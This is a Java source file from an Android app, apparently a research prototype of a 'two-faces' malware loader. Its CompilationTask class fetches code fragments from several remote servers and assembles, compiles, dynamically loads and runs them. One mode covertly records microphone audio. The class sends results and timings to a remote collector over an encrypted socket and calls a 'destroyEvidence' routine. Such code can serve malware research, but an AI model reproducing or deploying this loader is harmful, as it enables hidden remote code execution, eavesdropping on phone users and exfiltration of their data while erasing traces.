package com.android.app_2_faces_net;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import com.android.app_2_faces_net.compile_unit.Compiler;
import com.android.app_2_faces_net.compile_unit.InvalidSourceCodeException;
import com.android.app_2_faces_net.compile_unit.NotBalancedParenthesisException;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javassist.NotFoundException;

class CompilationTask implements Runnable {
    private static final String TAG = "CompilationTask";

    private final Context context;

    private final String socketCollectorHostname;
    private final int socketCollectorPort;
    private final String[] servers;
    private final String resultType;
    private final String arg;

    private CryptedSocket socketCollector;

    private final HashMap<Integer, String> pieces;

    public CompilationTask(Context context, String socketCollectorHostname, int socketCollectorPort, String[] servers, String resultType, String arg) {
        this.context = context;
        this.pieces = new HashMap<>();

        this.socketCollectorHostname = socketCollectorHostname;
        this.socketCollectorPort = socketCollectorPort;

        this.servers = servers;
        this.resultType = resultType;
        this.arg = arg;
    }

    @Override
    public void run() {
        try {
            //download phase
            long startDownloadPhase = System.nanoTime();
            this.pieces.clear();
            for (int i = 0; i < servers.length; i++) {
                String[] codeSenderParams = servers[i].split(":");

                DownloadTask task = new DownloadTask(codeSenderParams[0], Integer.parseInt(codeSenderParams[1]), i);
                ExecutorService executor = Executors.newSingleThreadExecutor();
                executor.execute(task);
            }

            while (this.pieces.size() < servers.length) {
                Thread.sleep(100);
            }
            StringBuilder codeBuilder = new StringBuilder();
            for (int i = 0; i < servers.length; i++) {
                codeBuilder.append(this.pieces.get(i));
            }
            String code = codeBuilder.toString();
            long endDownloadPhase = System.nanoTime();
            //end download phase


            //new Compile instance
            Compiler compiler = new Compiler(this.context, code, this.context.getFilesDir());

            //parsing phase
            long startParsing = System.nanoTime();
            compiler.parseSourceCode();
            long endParsing = System.nanoTime();
            //end parsing phase

            //compiling phase
            long startCompiling = System.nanoTime();
            compiler.compile();
            long endCompiling = System.nanoTime();
            //end compiling phase

            //dynamic loading phase
            long startLoading = System.nanoTime();
            compiler.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
            long endLoading = System.nanoTime();
            //end dynamic loading phase

            //execution phase
            long startExecution = System.nanoTime();
            Object obj = compiler.getInstance("RuntimeClass");
            String result;
            if (this.resultType.equals("Sound")) {
                Method firstMethod = obj.getClass().getDeclaredMethod("run", Context.class);
                MediaRecorder recorder = (MediaRecorder) firstMethod.invoke(obj, this.context);

                Thread.sleep(5000);

                Method secondMethod = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
                result = (String) secondMethod.invoke(obj, recorder, this.context);
            } else {
                Method method = obj.getClass().getDeclaredMethod("run", Context.class);
                result = (String) method.invoke(obj, this.context);
            }
            long endExecution = System.nanoTime();
            String resultToSend = "Result: " + result;
            //end execution phase

            //eval timing
            double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
            double timeToParse = (endParsing - startParsing) / 1000000.0;
            double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
            double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
            double timeToExecute = (endExecution - startExecution) / 1000000.0;
            String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;

            //collector phase
            this.socketCollector = new CryptedSocket(this.socketCollectorHostname, this.socketCollectorPort);
            this.socketCollector.connect();
            this.socketCollector.write(timingToSend + "|" + resultToSend);
            this.socketCollector.close();

            //destroy evidence
            compiler.destroyEvidence();
        } catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
            Thread.currentThread().interrupt();
        } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InvalidSourceCodeException | IOException e) {
            e.printStackTrace();
            this.socketCollector.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        this.socketCollector.close();
    }


    class DownloadTask implements Runnable {
        private static final String TAG = "DownloadTask";

        private final String socketCodeSenderHostname;
        private final int socketCodeSenderPort;
        private final int piecesNumber;

        private CryptedSocket socketCodeSender;

        public DownloadTask(String socketCodeSenderHostname, int socketCodeSenderPort, int pieceNumber) {
            this.socketCodeSenderHostname = socketCodeSenderHostname;
            this.socketCodeSenderPort = socketCodeSenderPort;
            this.piecesNumber = pieceNumber;
        }

        @Override
        public void run() {
            try {
                Log.d(TAG, "Starting downloadTask...");

                this.socketCodeSender = new CryptedSocket(this.socketCodeSenderHostname, this.socketCodeSenderPort);
                this.socketCodeSender.connect();

                String piece = this.socketCodeSender.read();
                pieces.put(this.piecesNumber, piece);

                this.socketCodeSender.close();
            } catch (IOException e) {
                e.printStackTrace();
                this.socketCodeSender.close();
            }
            this.socketCodeSender.close();
        }
    }
}